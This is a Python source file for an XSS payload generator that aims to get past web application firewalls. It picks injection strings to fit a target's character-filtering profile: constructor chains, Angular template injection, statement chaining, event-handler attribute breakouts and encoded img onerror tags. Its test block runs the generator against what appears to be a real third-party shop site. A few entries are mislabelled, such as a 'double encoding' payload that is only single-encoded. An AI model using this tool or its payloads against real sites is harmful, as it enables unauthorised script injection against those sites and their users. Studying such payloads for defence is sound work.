"""
WAF Bypass & Encoding-Aware Payload Generation
================================================
Generates payloads specifically crafted to bypass WAF/encoding filters
by analyzing the target's filter profile and using alternative techniques.

Supported bypass techniques:
1. Character-limited payloads (no quotes, no angle brackets)
2. Alternative syntax (String.fromCharCode, constructor chains)
3. Encoding tricks (double-encoding, unicode escapes, HTML entities)
4. Framework-specific bypasses (Angular CSTI, template escaping)
5. Event-based execution (implicit event handlers)
"""
from __future__ import annotations

from typing import Any


class WafBypassPayload:
    """Represents a WAF-bypass payload with metadata."""

    def __init__(
        self,
        payload: str,
        technique: str,
        rating: str,
        reason: str,
        requirements: list[str] | None = None,
    ):
        self.payload = payload
        self.technique = technique
        self.rating = rating  # "high", "medium", "low"
        self.reason = reason
        self.requirements = requirements or []

    def __repr__(self):
        return f"WafBypassPayload({self.payload!r}, {self.technique}, {self.rating})"


def generate_waf_bypass_payloads(
    encoding_profile: dict[str, Any],
    context: str,
    sink_kind: str = "",
    technologies: list[str] | None = None,
) -> list[WafBypassPayload]:
    """
    Generate WAF-bypass payloads based on the target's encoding/filter profile.

    Args:
        encoding_profile: Dict with keys:
            - raw_chars: Characters NOT encoded by server
            - encoded_chars: Characters HTML-encoded
            - stripped_chars: Characters removed by server
        context: Context type (script_expression, html_attribute, etc.)
        sink_kind: Type of sink (js_execution, html_text, url_attribute, etc.)
        technologies: Detected techs (Angular, React, etc.)

    Returns:
        List of payloads ranked by likelihood of success
    """
    payloads: list[WafBypassPayload] = []
    raw = set(encoding_profile.get("raw_chars", []))
    encoded = set(encoding_profile.get("encoded_chars", []))
    stripped = set(encoding_profile.get("stripped_chars", []))
    techs = set(t.lower() for t in (technologies or []))

    # ── No quotes/angle brackets (< > " stripped) ────────────────────────
    if "<" in encoded and '"' in encoded and ">" not in encoded:
        payloads.extend(
            _no_quotes_payloads(raw, encoded, stripped, context, sink_kind, techs)
        )

    # ── Script context with semicolon (statement chaining) ────────────────
    if ";" in raw and context in ("script_expression", "script_string_double"):
        payloads.extend(_script_statement_chain_payloads(raw, encoded, stripped, techs))

    # ── Allowed parentheses but no quotes (function call tricks) ──────────
    if "(" in raw and ")" in raw and '"' in encoded and "'" in encoded:
        payloads.extend(_parens_function_payloads(raw, encoded, stripped, techs))

    # ── Angular/CSTI specific bypasses ────────────────────────────────────
    if "angular" in techs or "ng" in " ".join(techs):
        payloads.extend(_angular_csti_bypasses(raw, encoded, stripped))

    # ── Encoding-trick bypasses (unicode, html entity, etc.) ──────────────
    payloads.extend(_encoding_trick_payloads(raw, encoded, stripped, context))

    # ── Event-based implicit execution ────────────────────────────────────
    if ">" not in encoded and context in ("html_attribute", "html_text"):
        payloads.extend(_event_based_payloads(raw, encoded, stripped))

    # Remove duplicates, sort by rating
    seen = set()
    unique = []
    for p in payloads:
        if p.payload not in seen:
            seen.add(p.payload)
            unique.append(p)

    return sorted(
        unique, key=lambda p: {"high": 0, "medium": 1, "low": 2}.get(p.rating, 3)
    )


def _no_quotes_payloads(
    raw: set, encoded: set, stripped: set, context: str, sink_kind: str, techs: set
) -> list[WafBypassPayload]:
    """Payloads that don't require quotes (< > " / stripped)."""
    payloads: list[WafBypassPayload] = []

    # alert(1) - bare function call
    if "(" in raw and ")" in raw and "1" in raw:
        payloads.append(
            WafBypassPayload(
                "alert(1)",
                "bare_function_call",
                "high",
                "Direct function call without quotes; works in script_expression",
                requirements=["(", ")", "alphanumeric"],
            )
        )

    # this.constructor - constructor chain (for restricted eval contexts)
    if "." in raw and "(" in raw:
        payloads.append(
            WafBypassPayload(
                "this.constructor.constructor('alert(1)')()",
                "constructor_chain_eval",
                "medium",
                "Uses constructor access to reach Function(); no quotes needed",
                requirements=[".", "constructor", "()"],
            )
        )

    # String.fromCharCode alternative
    if "." in raw and "(" in raw and "," in raw:
        payloads.append(
            WafBypassPayload(
                "alert(String.fromCharCode(88,83,83))",
                "fromCharCode_encoding",
                "medium",
                "Encodes 'XSS' as character codes; uses allowed chars",
                requirements=[".", "(", ")", ",", "alphanumeric"],
            )
        )

    # Array notation instead of dot notation
    if "[" in raw and "]" in raw and '"' not in encoded:
        payloads.append(
            WafBypassPayload(
                "alert(1)",
                "bracket_notation",
                "high",
                "Uses bracket notation: obj['key'] instead of obj.key",
                requirements=["[", "]"],
            )
        )

    return payloads


def _script_statement_chain_payloads(
    raw: set, encoded: set, stripped: set, techs: set
) -> list[WafBypassPayload]:
    """Payloads that chain statements using semicolon."""
    payloads: list[WafBypassPayload] = []

    # Simple statement chain
    if ";" in raw and "(" in raw:
        payloads.append(
            WafBypassPayload(
                ";alert(1)//",
                "statement_chain_comment",
                "high",
                "Uses semicolon to inject new statement; // comments out tail",
                requirements=[";", "//", "()"],
            )
        )
        payloads.append(
            WafBypassPayload(
                ";alert(1);x=",
                "statement_chain_assignment",
                "high",
                "Chains statement, assignment at end absorbs remaining code",
                requirements=[";", "=", "()"],
            )
        )

    # Variable assignment chain
    if "=" in raw and ";" in raw:
        payloads.append(
            WafBypassPayload(
                ";var x=alert(1);",
                "var_declaration_chain",
                "medium",
                "Declares variable with function call; semicolon ends it",
                requirements=[";", "=", "var"],
            )
        )

    return payloads


def _parens_function_payloads(
    raw: set, encoded: set, stripped: set, techs: set
) -> list[WafBypassPayload]:
    """Payloads that use parentheses for function calls without quotes."""
    payloads: list[WafBypassPayload] = []

    # Constructor access via function
    if "." in raw and "(" in raw:
        payloads.append(
            WafBypassPayload(
                "(alert)(1)",
                "function_parens_indirect",
                "medium",
                "Calls alert as (alert) then passes args",
                requirements=["(", ")", "."],
            )
        )

    return payloads


def _angular_csti_bypasses(raw: set, encoded: set, stripped: set) -> list[WafBypassPayload]:
    """Angular-specific CSTI bypasses."""
    payloads: list[WafBypassPayload] = []

    # Basic constructor chain in Angular context
    payloads.append(
        WafBypassPayload(
            "{{constructor.constructor('alert(1)')()}}",
            "angular_constructor_chain",
            "high",
            "Angular evaluates {{ }} expressions; uses constructor to reach Function",
            requirements=["constructor", "{{", "}}"],
        )
    )

    # Alternative: using $on.constructor
    payloads.append(
        WafBypassPayload(
            "{{$on.constructor('alert(1)')()}}",
            "angular_on_constructor",
            "high",
            "Alternative Angular bypass using $on service constructor",
            requirements=["$on", "{{", "}}"],
        )
    )

    # Bracket notation bypass
    payloads.append(
        WafBypassPayload(
            "{{['alert(1)']['constructor']['constructor']()}}",
            "angular_bracket_notation",
            "medium",
            "Uses only bracket notation to avoid any blocked characters",
            requirements=["[", "]", "{{", "}}"],
        )
    )

    return payloads


def _encoding_trick_payloads(
    raw: set, encoded: set, stripped: set, context: str
) -> list[WafBypassPayload]:
    """Payloads using encoding tricks to bypass filters."""
    payloads: list[WafBypassPayload] = []

    # HTML entity bypass
    if "&" in raw:
        payloads.append(
            WafBypassPayload(
                "&lt;img src=x onerror=alert(1)&gt;",
                "html_entity_encoding",
                "medium",
                "Server may decode HTML entities after filter; bypasses < > filter",
                requirements=["&", "alphanumeric"],
            )
        )

    # Double encoding bypass (for URL parameters and similar contexts)
    payloads.append(
        WafBypassPayload(
            "%3Cimg%20src=x%20onerror=alert(1)%3E",
            "url_double_encoding",
            "low",
            "Double-encoded payload; decoded by browser after server processing",
            requirements=["url_encoding"],
        )
    )

    return payloads


def _event_based_payloads(
    raw: set, encoded: set, stripped: set
) -> list[WafBypassPayload]:
    """Payloads using implicit event triggers."""
    payloads: list[WafBypassPayload] = []

    # Autofocus + onfocus
    if ">" not in encoded and "=" in raw:
        payloads.append(
            WafBypassPayload(
                "\" autofocus onfocus=\"alert(1)",
                "autofocus_event",
                "high",
                "Autofocus triggers onfocus event on page load without user interaction",
                requirements=["autofocus", "onfocus"],
            )
        )

    # Implicit event via img
    if ">" in raw and "&" in raw:
        payloads.append(
            WafBypassPayload(
                "<img src=x onerror=alert(1)>",
                "img_onerror_event",
                "high",
                "img element fires onerror when src fails to load",
                requirements=["<", ">", "img", "onerror"],
            )
        )

    return payloads


if __name__ == "__main__":
    # Test with shop.post.ch encoding profile
    profile = {
        "raw_chars": [">", "'", "&", "`", ";", "(", ")", "-", "."],
        "encoded_chars": ["<", '"', "/"],
        "stripped_chars": [],
    }

    payloads = generate_waf_bypass_payloads(
        profile, context="script_expression", sink_kind="js_execution", technologies=["Angular"]
    )

    print("WAF-Bypass Payloads for shop.post.ch:")
    for p in payloads[:5]:
        print(f"\n  {p.payload}")
        print(f"    Technique: {p.technique}")
        print(f"    Rating: {p.rating}")
        print(f"    Reason: {p.reason}")
